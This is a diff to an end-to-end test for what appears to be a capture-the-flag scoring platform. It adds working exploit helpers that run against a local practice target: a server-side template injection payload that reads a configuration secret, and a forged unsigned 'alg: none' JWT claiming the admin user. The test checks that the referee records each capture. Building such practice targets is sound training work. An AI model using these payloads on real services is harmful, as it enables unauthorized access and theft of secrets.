@@ -8,6 +8,8 @@ report. Runs without Docker so it can gate CI or a local change.
 """
 from __future__ import annotations
 
+import base64
+import json
 import os
 import re
 import subprocess
@@ -69,6 +71,25 @@ def _cmdi_flag(flag_path: Path) -> str:
     return m.group(0)
 
 
+def _ssti_flag() -> str:
+    resp = requests.post(f"{TARGET}/api/v1/render",
+                         json={"template": "{{ config['FLAG'] }}"}, timeout=5)
+    m = FLAG_RE.search(resp.json().get("rendered", ""))
+    if not m:
+        raise RuntimeError("SSTI did not render the flag")
+    return m.group(0)
+
+
+def _jwt_flag() -> str:
+    def seg(obj: dict) -> str:
+        return base64.urlsafe_b64encode(
+            json.dumps(obj, separators=(",", ":")).encode()
+        ).rstrip(b"=").decode()
+
+    token = f"{seg({'alg': 'none', 'typ': 'JWT'})}.{seg({'username': 'admin'})}."
+    return requests.post(f"{TARGET}/api/v1/account", json={"token": token}, timeout=5).json()["flag"]
+
+
 def _spawn(module_dir: Path, env: dict) -> subprocess.Popen:
     return subprocess.Popen([sys.executable, "-m", "src.app"], cwd=module_dir, env=env,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -98,7 +119,8 @@ def main() -> int:
 
         flag_path = tmp / "flags" / "flag_current.txt"
         checks = {"sqli": _sqli_flag(), "xss": _xss_flag(),
-                  "cmdi": _cmdi_flag(flag_path), "idor": _idor_flag()}
+                  "cmdi": _cmdi_flag(flag_path), "idor": _idor_flag(),
+                  "ssti": _ssti_flag(), "jwt": _jwt_flag()}
 
         for vector, flag in checks.items():
             verdict = requests.post(f"{REFEREE}/flags/submit",
@@ -113,7 +135,7 @@ def main() -> int:
         assert report["scores"]["red"] > 0, report
         assert set(report["vectors_detected"]) == set(), "no blue in this smoke"
         captured = {c["vector"] for c in report["captures"]}
-        assert {"sqli", "xss", "cmdi", "idor"} <= captured, captured
+        assert {"sqli", "xss", "cmdi", "idor", "ssti", "jwt"} <= captured, captured
         print(f"e2e match: red scored {report['scores']['red']} across {sorted(captured)}")
         return 0
     finally:
